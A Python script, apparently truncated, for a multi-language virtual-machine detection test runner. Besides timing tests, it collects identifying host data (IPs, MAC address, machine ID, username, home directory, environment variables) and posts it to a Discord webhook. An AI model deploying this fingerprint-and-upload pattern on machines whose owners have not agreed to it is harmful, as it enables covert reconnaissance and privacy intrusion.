#!/usr/bin/env python3

"""
Portable Unified VMtest Runner
Combines static builder capabilities with unified runner orchestration.
Creates a fully portable, self-contained VMtest suite.
"""

import json
import os
import sys
import time
import subprocess
import platform
import shutil
import argparse
import tempfile
import zipfile
import socket
import uuid
import getpass
from datetime import datetime
from pathlib import Path
import requests

class PortableUnifiedRunner:
    def __init__(self, iterations=1000, output_dir=None, verbose=False, portable_mode=False, webhook_url=None):
        self.iterations = iterations
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="vmtest_")
        self.verbose = verbose
        self.portable_mode = portable_mode
        self.webhook_url = webhook_url  # ADD THIS LINE
        self.results = {}
        self.measurement_keys = [
            'TIMING_BASIC_MEAN', 'TIMING_BASIC_VARIANCE', 'TIMING_BASIC_CV',
            'TIMING_BASIC_SKEWNESS', 'TIMING_BASIC_KURTOSIS',
            'TIMING_CONSECUTIVE_MEAN', 'TIMING_CONSECUTIVE_VARIANCE', 'TIMING_CONSECUTIVE_CV',
            'TIMING_CONSECUTIVE_SKEWNESS', 'TIMING_CONSECUTIVE_KURTOSIS',
            'SCHEDULING_THREAD_MEAN', 'SCHEDULING_THREAD_VARIANCE', 'SCHEDULING_THREAD_CV',
            'SCHEDULING_THREAD_SKEWNESS', 'SCHEDULING_THREAD_KURTOSIS',
            'PHYSICAL_MACHINE_INDEX',
            'SCHEDULING_MULTIPROC_MEAN', 'SCHEDULING_MULTIPROC_VARIANCE', 'SCHEDULING_MULTIPROC_CV',
            'SCHEDULING_MULTIPROC_SKEWNESS', 'SCHEDULING_MULTIPROC_KURTOSIS',
            'MULTIPROC_PHYSICAL_MACHINE_INDEX',
            'CACHE_ACCESS_RATIO', 'CACHE_MISS_RATIO',
            'MEMORY_ADDRESS_ENTROPY',
            'OVERALL_TIMING_CV', 'OVERALL_SCHEDULING_CV'
        ]
    
        # Determine if we're running as a PyInstaller bundle
        if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
            self.portable_mode = True
            self.bundle_dir = Path(sys._MEIPASS)
        else:
            self.bundle_dir = Path(__file__).parent
        
        # Define portable executable paths and fallbacks
        self.implementations = self._get_implementation_config()
        
    def _get_implementation_config(self):
        """Get implementation configuration with portable and fallback options"""
        platform_suffix = ".exe" if platform.system() == "Windows" else ""
        
        return {
            'c': {
                'portable_binary': f'vmtest{platform_suffix}',
                'source': 'vmtest.c',
                'compile_cmd': self._get_c_compile_cmd(),
                'fallback_cmd': f'./vmtest{platform_suffix}'
            },
            'python': {
                'portable_binary': f'vmtest_python{platform_suffix}',
                'source': 'vmtest.py',
                'fallback_cmd': f'python3 vmtest.py {self.iterations}'
            },
            'nodejs': {
                'portable_binary': 'node' + platform_suffix,
                'source': 'vmtest.js',
                'js_file': 'vmtest.js',  # ENSURE THIS IS PRESENT
                'fallback_cmd': f'node vmtest.js {self.iterations}'
            },
            'ruby': {
                'portable_binary': f'vmtest_ruby{platform_suffix}',
                'source': 'vmtest.rb', 
                'fallback_cmd': f'ruby vmtest.rb {self.iterations}'
            }
        }

    def _get_c_compile_cmd(self):
        """Get appropriate C compilation command for the platform"""
        if platform.system() == 'Darwin':  # macOS
            return 'gcc -o vmtest vmtest.c -lpthread -lm -O2'
        elif platform.system() == 'Linux':
            return 'gcc -o vmtest vmtest.c -lpthread -lm -lrt -O2'
        else:  # Windows
            return 'gcc -o vmtest.exe vmtest.c -lpthread -lm -O2'

    def _log(self, message, level='INFO'):
        """Log message with timestamp to both console and results"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        prefix = f"[{timestamp}] [{level}]"
        formatted_message = f"{prefix} {message}"
        
        # Print to console
        print(formatted_message)
        
        # Store in log for later inclusion in results
        if not hasattr(self, 'execution_log'):
            self.execution_log = []
        self.execution_log.append({
            'timestamp': timestamp,
            'level': level,
            'message': message
        })
        
        if self.verbose or level in ['ERROR', 'WARNING']:
            sys.stdout.flush()

    def _gather_system_info(self):
        """Gather comprehensive system identification information"""
        self._log("🔍 Gathering system identification information...")
        
        system_info = {
            'timestamp': datetime.now().isoformat(),
            'basic_info': {},
            'network_info': {},
            'hardware_info': {},
            'user_info': {},
            'environment_info': {}
        }
        
        # Basic system information
        try:
            system_info['basic_info'] = {
                'machine_name': platform.node(),
                'hostname': socket.gethostname(),
                'fqdn': socket.getfqdn(),
                'platform': platform.platform(),
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'architecture': platform.architecture(),
                'python_version': platform.python_version(),
                'python_implementation': platform.python_implementation()
            }
        except Exception as e:
            self._log(f"Error gathering basic info: {e}", 'WARNING')
        
        # Network information
        try:
            # Get IP addresses
            ip_addresses = []
            try:
                # Get local IP by connecting to external address
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
                ip_addresses.append(local_ip)
            except:
                pass
            
            # Get all network interfaces (if available)
            try:
                import netifaces
                for interface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addrs:
                        for addr in addrs[netifaces.AF_INET]:
                            if addr['addr'] not in ip_addresses:
                                ip_addresses.append(addr['addr'])
            except ImportError:
                # netifaces not available, try alternative method
                try:
                    hostname = socket.gethostname()
                    ip_list = socket.gethostbyname_ex(hostname)[2]
                    for ip in ip_list:
                        if ip not in ip_addresses and not ip.startswith("127."):
                            ip_addresses.append(ip)
                except:
                    pass
            
            system_info['network_info'] = {
                'ip_addresses': ip_addresses,
                'hostname': socket.gethostname(),
                'fqdn': socket.getfqdn()
            }
            
            # Try to get MAC address
            try:
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
                system_info['network_info']['mac_address'] = mac
            except:
                pass
                
        except Exception as e:
            self._log(f"Error gathering network info: {e}", 'WARNING')
        
        # Hardware information
        try:
            system_info['hardware_info'] = {
                'machine_id': self._get_machine_id(),
                'cpu_count': os.cpu_count(),
                'boot_time': self._get_boot_time()
            }
            
            # Try to get more hardware details
            try:
                import psutil
                system_info['hardware_info'].update({
                    'cpu_freq': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None,
                    'memory_total': psutil.virtual_memory().total,
                    'disk_usage': {partition.device: psutil.disk_usage(partition.mountpoint)._asdict() 
                                 for partition in psutil.disk_partitions()},
                })
            except ImportError:
                pass
                
        except Exception as e:
            self._log(f"Error gathering hardware info: {e}", 'WARNING')
        
        # User information
        try:
            system_info['user_info'] = {
                'username': getpass.getuser(),
                'user_id': os.getuid() if hasattr(os, 'getuid') else None,
                'group_id': os.getgid() if hasattr(os, 'getgid') else None,
                'home_directory': os.path.expanduser('~'),
                'current_directory': os.getcwd()
            }
        except Exception as e:
            self._log(f"Error gathering user info: {e}", 'WARNING')
        
        # Environment information
        try:
            env_vars = ['PATH', 'HOME', 'USER', 'USERNAME', 'COMPUTERNAME', 'USERDOMAIN', 
                       'PROCESSOR_IDENTIFIER', 'PROCESSOR_ARCHITECTURE', 'NUMBER_OF_PROCESSORS']
            system_info['environment_info'] = {
                var: os.environ.get(var) for var in env_vars if os.environ.get(var)
            }
            
            # Add timezone info
            try:
                import time
                system_info['environment_info']['timezone'] = time.tzname
                system_info['environment_info']['utc_offset'] = time.timezone
            except:
                pass
                
        except Exception as e:
            self._log(f"Error gathering environment info: {e}", 'WARNING')
        
        # Print system information to console
        self._print_system_info_summary(system_info)
        
        return system_info

    def _get_machine_id(self):
        """Get unique machine identifier"""
        try:
            # Try different methods to get machine ID
            if platform.system() == 'Linux':
                try:
                    with open('/etc/machine-id', 'r') as f:
                        return f.read().strip()
                except:
                    try:
                        with open('/var/lib/dbus/machine-id', 'r') as f:
                            return f.read().strip()
                    except:
                        pass
            elif platform.system() == 'Windows':
                try:
                    import winreg
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                       r"SOFTWARE\Microsoft\Cryptography")
                    value, _ = winreg.QueryValueEx(key, "MachineGuid")
                    winreg.CloseKey(key)
                    return value
                except:
                    pass
            elif platform.system() == 'Darwin':
                try:
                    result = subprocess.run(['ioreg', '-rd1', '-c', 'IOPlatformExpertDevice'], 
                                          capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if 'IOPlatformUUID' in line:
                            return line.split('"')[3]
                except:
                    pass
            
            # Fallback to UUID based on MAC address
            return str(uuid.uuid1())
            
        except:
            return str(uuid.uuid4())

    def _get_boot_time(self):
        """Get system boot time"""
        try:
            import psutil
            return datetime.fromtimestamp(psutil.boot_time()).isoformat()
        except ImportError:
            try:
                if platform.system() == 'Linux':
                    with open('/proc/uptime', 'r') as f:
                        uptime_seconds = float(f.readline().split()[0])
                        boot_time = time.time() - uptime_seconds
                        return datetime.fromtimestamp(boot_time).isoformat()
                elif platform.system() == 'Windows':
                    import subprocess
                    result = subprocess.run(['wmic', 'os', 'get', 'LastBootUpTime'], 
                                          capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if line.strip() and 'LastBootUpTime' not in line:
                            # Parse Windows timestamp format
                            timestamp = line.strip()[:14]
                            return datetime.strptime(timestamp, '%Y%m%d%H%M%S').isoformat()
            except:
                pass
        except:
            pass
        return None

    def _print_system_info_summary(self, system_info):
        """Print a readable summary of system information to console"""
        self._log("=" * 70)
        self._log("🖥️  SYSTEM IDENTIFICATION SUMMARY")
        self._log("=" * 70)
        
        # Basic info
        basic = system_info.get('basic_info', {})
        self._log(f"Machine Name: {basic.get('machine_name', 'Unknown')}")
        self._log(f"Hostname: {basic.get('hostname', 'Unknown')}")
        self._log(f"FQDN: {basic.get('fqdn', 'Unknown')}")
        self._log(f"Platform: {basic.get('platform', 'Unknown')}")
        self._log(f"Architecture: {basic.get('machine', 'Unknown')} / {basic.get('processor', 'Unknown')}")
        
        # Network info
        network = system_info.get('network_info', {})
        if network.get('ip_addresses'):
            self._log(f"IP Addresses: {', '.join(network['ip_addresses'])}")
        if network.get('mac_address'):
            self._log(f"MAC Address: {network['mac_address']}")
        
        # Hardware info
        hardware = system_info.get('hardware_info', {})
        if hardware.get('machine_id'):
            self._log(f"Machine ID: {hardware['machine_id']}")
        if hardware.get('cpu_count'):
            self._log(f"CPU Cores: {hardware['cpu_count']}")
        if hardware.get('boot_time'):
            self._log(f"Boot Time: {hardware['boot_time']}")
        
        # User info
        user = system_info.get('user_info', {})
        if user.get('username'):
            self._log(f"Current User: {user['username']}")
        if user.get('current_directory'):
            self._log(f"Working Directory: {user['current_directory']}")
        
        # Environment highlights
        env = system_info.get('environment_info', {})
        if env.get('COMPUTERNAME'):
            self._log(f"Computer Name: {env['COMPUTERNAME']}")
        if env.get('USERDOMAIN'):
            self._log(f"User Domain: {env['USERDOMAIN']}")
        if env.get('timezone'):
            self._log(f"Timezone: {env['timezone']}")
        
        self._log("=" * 70)
    def _find_portable_executable(self, lang):
        """Find portable executable for a language implementation"""
        impl = self.implementations[lang]
        
        # Special handling for Node.js FIRST (before checking standalone executable)
        if lang == 'nodejs' and 'js_file' in impl:
            node_binary = self.bundle_dir / impl['portable_binary']
            self._log(f"DEBUG: Checking Node.js binary at: {node_binary}")
            self._log(f"DEBUG: Node.js binary exists: {node_binary.exists()}")
            
            if node_binary.exists():
                # Check multiple locations for vmtest.js
                js_locations = [
                    self.bundle_dir / impl['js_file'],
                    self.bundle_dir / "vmtest.js",
                    Path("vmtest.js")
                ]
                
                self._log(f"DEBUG: Checking JS file locations: {js_locations}")
                
                for js_path in js_locations:
                    self._log(f"DEBUG: Checking {js_path} - exists: {js_path.exists()}")
                    if js_path.exists():
                        self._log(f"Found portable Node.js + JS: {node_binary}, {js_path}")
                        # Return special format to indicate Node.js needs special handling
                        return f'NODEJS_SPECIAL:{node_binary}:{js_path}'
                
                # DEBUG: List all files in bundle directory
                try:
                    bundle_files = list(self.bundle_dir.iterdir())
                    self._log(f"DEBUG: All files in bundle directory: {[f.name for f in bundle_files]}")
                    
                    # Look for any .js files
                    js_files = [f for f in bundle_files if f.name.endswith('.js')]
                    self._log(f"DEBUG: Found .js files: {[f.name for f in js_files]}")
                    
                    # If we find any .js file, use the first one
                    if js_files:
                        js_file = js_files[0]
                        self._log(f"Using found JS file: {js_file}")
                        return f'NODEJS_SPECIAL:{node_binary}:{js_file}'
                        
                except Exception as e:
                    self._log(f"DEBUG: Could not list bundle directory: {e}")
                
                self._log(f"Node.js binary found but no JS file at: {js_locations}")
                # Don't return the Node.js binary alone - it won't work without JS
                return None
        
        # Look for regular portable executable in bundle directory
        portable_path = self.bundle_dir / impl['portable_binary']
        if portable_path.exists() and os.access(portable_path, os.X_OK):
            self._log(f"Found portable {lang.upper()} executable: {portable_path}")
            return str(portable_path)
        
        # Look in current working directory
        local_path = Path(impl['portable_binary'])
        if local_path.exists() and os.access(local_path, os.X_OK):
            self._log(f"Found local {lang.upper()} executable: {local_path}")
            return str(local_path)
        
        return None

    def _check_dependencies(self):
        """Check available implementations (portable first, then system)"""
        available = {}
        
        for lang in ['c', 'python', 'nodejs', 'ruby']:
            # First try to find portable executable
            portable_exec = self._find_portable_executable(lang)
            if portable_exec:
                available[lang] = f"portable: {portable_exec}"
                continue
            
            # Fall back to system dependencies
            if lang == 'c':
                # Check if source exists and we can compile
                if (self.bundle_dir / 'vmtest.c').exists() or Path('vmtest.c').exists():
                    if shutil.which('gcc'):
                        available[lang] = "source + gcc"
                        self._log(f"{lang.upper()} available: source compilation")
                    else:
                        self._log(f"{lang.upper()} source found but no compiler", 'WARNING')
                else:
                    self._log(f"{lang.upper()} source not found", 'WARNING')
            else:
                # Check system interpreter
                interpreter = {'python': 'python3', 'nodejs': 'node', 'ruby': 'ruby'}[lang]
                try:
                    result = subprocess.run([interpreter, '--version'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        version = result.stdout.strip().split('\n')[0]
                        available[lang] = f"system: {version}"
                        self._log(f"{lang.upper()} available: {version}")
                    else:
                        self._log(f"{lang.upper()} not available", 'WARNING')
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    self._log(f"{lang.upper()} not available", 'WARNING')
                    
        return available

    def _compile_c_implementation(self):
        """Compile C implementation if needed"""
        source_paths = [self.bundle_dir / 'vmtest.c', Path('vmtest.c')]
        source_file = None
        
        for path in source_paths:
            if path.exists():
                source_file = path
                break
        
        if not source_file:
            self._log("vmtest.c not found", 'WARNING')
            return False
            
        try:
            cmd = self.implementations['c']['compile_cmd']
            self._log(f"Compiling C implementation: {cmd}")
            
            # Modify command to use found source file
            cmd_parts = cmd.split()
            for i, part in enumerate(cmd_parts):
                if part == 'vmtest.c':
                    cmd_parts[i] = str(source_file)
                    break
            
            result = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self._log("C compilation successful")
                return True
            else:
                self._log(f"C compilation failed: {result.stderr}", 'ERROR')
                return False
                
        except subprocess.TimeoutExpired:
            self._log("C compilation timed out", 'ERROR')
            return False
        except Exception as e:
            self._log(f"C compilation error: {e}", 'ERROR')
            return False

    def _run_implementation(self, lang, available_deps):
        """Run a specific language implementation (portable or fallback)"""
        if lang not in available_deps:
            self._log(f"Skipping {lang.upper()}: not available", 'WARNING')
            return None
            
        impl = self.implementations[lang]
        dep_info = available_deps[lang]
        
        # Determine execution command
        if dep_info.startswith("portable:"):
            # Use portable executable
            portable_path = dep_info.replace("portable: ", "")
            
            # FIXED: Special handling for Node.js + MORE DEBUG
            if lang == 'nodejs' and portable_path.startswith('NODEJS_SPECIAL:'):
                # Parse: NODEJS_SPECIAL:node_path:js_path
                parts = portable_path.split(':', 2)
                self._log(f"DEBUG: Node.js special format parts: {parts}")
                
                if len(parts) == 3:
                    node_binary = parts[1]
                    js_file = parts[2]
                    cmd = f'"{node_binary}" "{js_file}" {self.iterations}'
                    self._log(f"DEBUG: Constructed Node.js command: {cmd}")
                else:
                    self._log(f"Invalid Node.js special format: {portable_path}", 'ERROR')
                    return None
            else:
                cmd = f'"{portable_path}"'
                if lang != 'c':  # C executable doesn't need iterations as parameter
                    cmd += f' {self.iterations}'
        else:
            # Fallback handling for system implementations
            if lang == 'c':
                if not self._compile_c_implementation():
                    return None
                cmd = impl['fallback_cmd']
            else:
                cmd = impl['fallback_cmd']
        
        # Execute the implementation
        try:
            self._log(f"Running {lang.upper()}: {cmd}")
            start_time = time.time()

            result = subprocess.run(
                cmd, 
                shell=True,
                capture_output=True, 
                text=True, 
                timeout=300,  # 5 minute timeout
                cwd=str(self.bundle_dir) if self.portable_mode else None
            )
            execution_time = time.time() - start_time
            
            # DEBUG: Add more verbose error reporting for Node.js
            if lang == 'nodejs' and result.returncode != 0:
                self._log(f"DEBUG: Node.js exit code: {result.returncode}")
                self._log(f"DEBUG: Node.js stdout: {result.stdout}")
                self._log(f"DEBUG: Node.js stderr: {result.stderr}")
                self._log(f"DEBUG: Working directory: {self.bundle_dir if self.portable_mode else os.getcwd()}")
            
            if result.returncode == 0:
                try:
                    print("JSON searching...")
                    # Find JSON in output
                    output_lines = result.stdout.strip().split('\n')
                    json_start = -1
                    json_end = -1
                    
                    for i, line in enumerate(output_lines):
                        if line.strip().startswith('{'):
                            json_start = i
                            break
                    
                    if json_start >= 0:
                        for i in range(len(output_lines) - 1, json_start - 1, -1):
                            if output_lines[i].strip().endswith('}'):
                                json_end = i
                                break
                    
                    if json_start >= 0 and json_end >= 0:
                        json_text = '\n'.join(output_lines[json_start:json_end + 1])
                        data = json.loads(json_text)
                        
                        self._log(f"{lang.upper()}: Completed in {execution_time:.2f}s")
                        # Add metadata
                        data['execution_time_seconds'] = execution_time
                        data['language'] = lang

                        self._log(f"{lang.upper()}: Completed in {execution_time:.2f}s")
                        return data
                    else:
                        self._log(f"{lang.upper()}: No JSON found in output", 'ERROR')
                        return None
                except json.JSONDecodeError as e:
                    self._log(f"{lang.upper()}: Failed to parse JSON output: {e}", 'ERROR')
                    if self.verbose:
                        self._log(f"Raw output: {result.stdout[:500]}...")
                    return None
            else:
                self._log(f"{lang.upper()} execution failed: {result.stderr}", 'ERROR')
                return None
                
        except subprocess.TimeoutExpired:
            self._log(f"{lang.upper()} execution timed out", 'ERROR')
            return None
        except Exception as e:
            self._log(f"{lang.upper()} execution error: {e}", 'ERROR')
            return None
    def _create_csv_report(self):
        """Create CSV report from results"""
        if not self.results:
            return ""
        
        import csv
        import io
        
        # Define all possible measurement keys
        measurement_keys = [
            'TIMING_BASIC_MEAN', 'TIMING_BASIC_VARIANCE', 'TIMING_BASIC_CV',
            'TIMING_BASIC_SKEWNESS', 'TIMING_BASIC_KURTOSIS',
            'TIMING_CONSECUTIVE_MEAN', 'TIMING_CONSECUTIVE_VARIANCE', 'TIMING_CONSECUTIVE_CV',
            'TIMING_CONSECUTIVE_SKEWNESS', 'TIMING_CONSECUTIVE_KURTOSIS',
            'SCHEDULING_THREAD_MEAN', 'SCHEDULING_THREAD_VARIANCE', 'SCHEDULING_THREAD_CV',
            'SCHEDULING_THREAD_SKEWNESS', 'SCHEDULING_THREAD_KURTOSIS',
            'PHYSICAL_MACHINE_INDEX',
            'SCHEDULING_MULTIPROC_MEAN', 'SCHEDULING_MULTIPROC_VARIANCE', 'SCHEDULING_MULTIPROC_CV',
            'SCHEDULING_MULTIPROC_SKEWNESS', 'SCHEDULING_MULTIPROC_KURTOSIS',
            'MULTIPROC_PHYSICAL_MACHINE_INDEX',
            'CACHE_ACCESS_RATIO', 'CACHE_MISS_RATIO',
            'MEMORY_ADDRESS_ENTROPY',
            'OVERALL_TIMING_CV', 'OVERALL_SCHEDULING_CV'
        ]
        
        # Create CSV in memory
        output = io.StringIO()
        writer = csv.writer(output)
        
        # Header row: Measurement, Language1, Language2, ...
        languages = sorted(self.results.keys())
        header = ['Measurement'] + languages
        writer.writerow(header)
        scientific_notation_keys = {
            'PHYSICAL_MACHINE_INDEX',
            'MULTIPROC_PHYSICAL_MACHINE_INDEX'
        }
        # Data rows: one per measurement
        for measurement in measurement_keys:
            row = [measurement]
            for lang in languages:
                if lang in self.results and 'measurements' in self.results[lang]:
                    value = self.results[lang]['measurements'].get(measurement, 'N/A')
                    # Format numbers to 6 decimal places if they're floats
                    if isinstance(value, (int, float)) and value != 'N/A':
                        if measurement in scientific_notation_keys:
                            # Use scientific notation for machine indexes
                            row.append(f"{value:.6e}")
                        else:
                            # Use regular decimal notation for other measurements
                            row.append(f"{value:.6f}")
                    else:
                        row.append(str(value))
                else:
                    row.append('N/A')
            writer.writerow(row)
        
        return output.getvalue()

    def _post_to_discord(self, csv_content, webhook_url, system_info):
        """Post CSV and system info to Discord webhook"""
        import requests
        
        if not webhook_url:
            self._log("No Discord webhook URL provided - skipping Discord post")
            return
        
        try:
            # Extract key system information
            basic = system_info.get('basic_info', {})
            network = system_info.get('network_info', {})
            hardware = system_info.get('hardware_info', {})
            
            # Create comprehensive summary message
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            languages = list(self.results.keys())
            
            # Determine VM detection result
            vm_detections = {}
            for lang, result in self.results.items():
                if result and 'vm_indicators' in result:
                    vm_detections[lang] = result['vm_indicators'].get('likely_vm', False)
            
            vm_votes = list(vm_detections.values()) if vm_detections else []
            vm_consensus = sum(vm_votes) / len(vm_votes) if vm_votes else 0
            vm_detected = vm_consensus > 0.5
            
            # Build summary message
            summary = f"**🖥️ VMTest Results - {timestamp}**\n\n"
            
            # System identification
            summary += f"**System Information:**\n"
            summary += f"• Machine: `{basic.get('machine_name', 'Unknown')}`\n"
            summary += f"• Platform: `{basic.get('platform', 'Unknown')}`\n"
            summary += f"• Architecture: `{basic.get('machine', 'Unknown')}`\n"
            
            # FIXED: Include ALL IP addresses
            ip_addresses = network.get('ip_addresses', [])
            if ip_addresses:
                if len(ip_addresses) == 1:
                    summary += f"• IP: `{ip_addresses[0]}`\n"
                else:
                    summary += f"• Primary IP: `{ip_addresses[0]}`\n"
                    summary += f"• All IPs: `{', '.join(ip_addresses[:15])}`"  # Limit to first 5 to avoid message length issues
                    if len(ip_addresses) > 15:
                        summary += f" (+{len(ip_addresses)-15} more)"
                    summary += "\n"
            
            if hardware.get('machine_id'):
                summary += f"• Machine ID: `{hardware['machine_id'][:100]}...`\n"
            summary += f"• CPU Cores: `{hardware.get('cpu_count', 'Unknown')}`\n"
            
            # Add MAC address if available
            if network.get('mac_address'):
                summary += f"• MAC: `{network['mac_address']}`\n"
            
            summary += "\n"
            
            # Test results
            summary += f"**Test Results:**\n"
            summary += f"• Languages tested: `{', '.join(languages)}`\n"
            summary += f"• Iterations: `{self.iterations}`\n"
            summary += f"• Portable mode: `{self.portable_mode}`\n\n"
            
            # VM Detection result
            if vm_detected:
                summary += f"🚨 **VM DETECTED** (Confidence: {vm_consensus:.1%})\n"
            else:
                summary += f"✅ **PHYSICAL MACHINE** (Confidence: {(1-vm_consensus):.1%})\n"
            
            # Per-language results
            if vm_detections:
                summary += f"\n**Detection by Language:**\n"
                for lang, detected in vm_detections.items():
                    status = "🚨 VM" if detected else "✅ Physical"
                    summary += f"• {lang.upper()}: {status}\n"
            
            # Execution times
            exec_times = []
            for lang, result in self.results.items():
                if result and 'execution_time_seconds' in result:
                    time_sec = result['execution_time_seconds']
                    exec_times.append(f"{lang}: {time_sec:.2f}s")
            
            if exec_times:
                summary += f"\n**Execution Times:** {', '.join(exec_times)}\n"
            
            summary += f"\n📊 **CSV Report attached with {len(self.measurement_keys)} measurements**"
            
            # Prepare Discord payload
            csv_filename = f"vmtest_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            
            files = {
                'file': (csv_filename, csv_content, 'text/csv')
            }
            
            data = {
                'content': summary
            }
            
            # Post to Discord
            self._log("Posting results to Discord...")
            response = requests.post(
                webhook_url,
                data=data,
                files=files,
                timeout=30
            )
            
            if response.status_code == 200:
                self._log("✅ Successfully posted to Discord!")
            else:
                self._log(f"❌ Discord post failed: {response.status_code} - {response.text}", 'ERROR')
                
        except Exception as e:
            self._log(f"❌ Discord post error: {e}", 'ERROR')

    def _analyze_cross_language_results(self):
        """Perform cross-language analysis of results"""
        if not self.results:
            return {}
            
        analysis = {
            'languages_tested': list(self.results.keys()),
            'consistent_vm_detection': True,
            'measurement_consistency': {},
            'performance_comparison': {},
            'consensus': {}
        }
        
        # Extract VM detection results
        vm_detections = {}
        for lang, result in self.results.items():
            if result and 'vm_indicators' in result:
                vm_detections[lang] = result['vm_indicators'].get('likely_vm', False)
                
        # Check consensus on VM detection
        if vm_detections:
            vm_votes = list(vm_detections.values())
            vm_consensus = sum(vm_votes) / len(vm_votes)
            analysis['consensus']['vm_detection_rate'] = vm_consensus
            analysis['consensus']['likely_vm'] = vm_consensus > 0.5
            
            # Check if all implementations agree
            analysis['consistent_vm_detection'] = len(set(vm_votes)) <= 1
            analysis['vm_detection_by_language'] = vm_detections
            
        return analysis

    def _generate_report(self, analysis, system_info):
        """Generate comprehensive report"""
        return {
            'unified_vmtest_report': {
                'metadata': {
                    'timestamp': datetime.now().isoformat(),
                    'runner_version': '2.0-portable',
                    'platform': platform.platform(),
                    'portable_mode': self.portable_mode,
                    'iterations': self.iterations
                },
                'system_identification': system_info,
                'execution_log': getattr(self, 'execution_log', []),
                'summary': {
                    'total_languages_tested': len(self.results),
                    'consensus_vm_detection': analysis.get('consensus', {}).get('likely_vm', False),
                    'detection_confidence': analysis.get('consensus', {}).get('vm_detection_rate', 0),
                    'measurements_consistent': analysis.get('consistent_vm_detection', False),
                    'fastest_implementation': self._get_fastest_implementation(),
                    'portable_executables_used': sum(1 for lang, result in self.results.items() 
                                                   if result and 'portable' in str(result.get('execution_method', '')))
                },
                'cross_language_analysis': analysis,
                'individual_results': self.results
            }
        }

    def _get_fastest_implementation(self):
        """Determine the fastest implementation"""
        if not self.results:
            return None
            
        execution_times = {}
        for lang, result in self.results.items():
            if result and 'execution_time_ms' in result:
                execution_times[lang] = result['execution_time_ms']
                
        if execution_times:
            return min(execution_times, key=execution_times.get)
        return None

    def _save_results(self, report):
        """Save results to files"""
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Save main report
        report_file = os.path.join(self.output_dir, 'unified_vmtest_report.json')
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        self._log(f"Report saved to: {report_file}")
        
        # Save individual results
        for lang, result in self.results.items():
            if result:
                individual_file = os.path.join(self.output_dir, f'vmtest_{lang}_result.json')
                with open(individual_file, 'w') as f:
                    json.dump(result, f, indent=2)
                    
        # Create summary text file
        summary_file = os.path.join(self.output_dir, 'summary.txt')
        with open(summary_file, 'w') as f:
            summary = report['unified_vmtest_report']['summary']
            analysis = report['unified_vmtest_report']['cross_language_analysis']
            
            f.write("VMtest Portable Unified Results Summary\n")
            f.write("=" * 45 + "\n\n")
            
            f.write(f"Runner mode: {'Portable executable' if self.portable_mode else 'Source mode'}\n")
            f.write(f"Languages tested: {summary['total_languages_tested']}\n")
            f.write(f"Portable executables used: {summary['portable_executables_used']}\n")
            f.write(f"Consensus VM detection: {summary['consensus_vm_detection']}\n")
            f.write(f"Detection confidence: {summary['detection_confidence']:.1%}\n")
            f.write(f"Measurements consistent: {summary['measurements_consistent']}\n")
            
            if summary['fastest_implementation']:
                f.write(f"Fastest implementation: {summary['fastest_implementation']}\n")
                
            f.write(f"\nDetection by language:\n")
            for lang, detected in analysis.get('vm_detection_by_language', {}).items():
                f.write(f"  {lang}: {'VM detected' if detected else 'Physical machine'}\n")
                
    def _print_comprehensive_summary(self, report):
        """Print detailed summary to console"""
        summary = report['unified_vmtest_report']['summary']
        analysis = report['unified_vmtest_report']['cross_language_analysis']
        system_info = report['unified_vmtest_report']['system_identification']
        
        self._log("\n" + "=" * 80)
        self._log("🎯 FINAL VMTEST ANALYSIS RESULTS")
        self._log("=" * 80)
        
        # System summary
        basic = system_info.get('basic_info', {})
        network = system_info.get('network_info', {})
        self._log(f"🖥️  Machine: {basic.get('machine_name', 'Unknown')} ({basic.get('platform', 'Unknown')})")
        if network.get('ip_addresses'):
            self._log(f"🌐 IP Address: {network['ip_addresses'][0] if network['ip_addresses'] else 'Unknown'}")
        
        # Test results summary
        self._log(f"\n📊 Test Results:")
        self._log(f"   Languages tested: {summary['total_languages_tested']}")
        self._log(f"   Portable executables used: {summary['portable_executables_used']}")
        self._log(f"   Fastest implementation: {summary.get('fastest_implementation', 'Unknown')}")
        
        # VM Detection result
        vm_detected = summary['consensus_vm_detection']
        confidence = summary['detection_confidence']
        
        self._log(f"\n🔍 VM Detection Analysis:")
        if vm_detected:
            self._log(f"   🚨 VIRTUAL MACHINE DETECTED")
            self._log(f"   📈 Confidence: {confidence:.1%}")
        else:
            self._log(f"   ✅ PHYSICAL MACHINE (No VM detected)")
            self._log(f"   📈 Confidence: {(1-confidence):.1%}")
        
        self._log(f"   🎯 Cross-language consistency: {'Yes' if summary['measurements_consistent'] else 'No'}")
        
        # Per-language breakdown
        vm_detections = analysis.get('vm_detection_by_language', {})
        if vm_detections:
            self._log(f"\n🔬 Detection by Language:")
            for lang, detected in vm_detections.items():
                status = "VM DETECTED" if detected else "Physical"
                self._log(f"   • {lang.upper()}: {status}")
        
        # Performance summary
        execution_times = {}
        for lang, result in self.results.items():
            if result and 'execution_time_ms' in result:
                execution_times[lang] = result['execution_time_ms']
        
        if execution_times:
            self._log(f"\n⚡ Performance Summary:")
            sorted_times = sorted(execution_times.items(), key=lambda x: x[1])
            for lang, time_ms in sorted_times:
                self._log(f"   • {lang.upper()}: {time_ms:.1f}ms")
        
        # Key measurements consistency
        if 'measurement_consistency' in analysis:
            self._log(f"\n📏 Key Measurements:")
            consistency = analysis['measurement_consistency']
            for measurement, stats in consistency.items():
                if 'coefficient_of_variation' in stats:
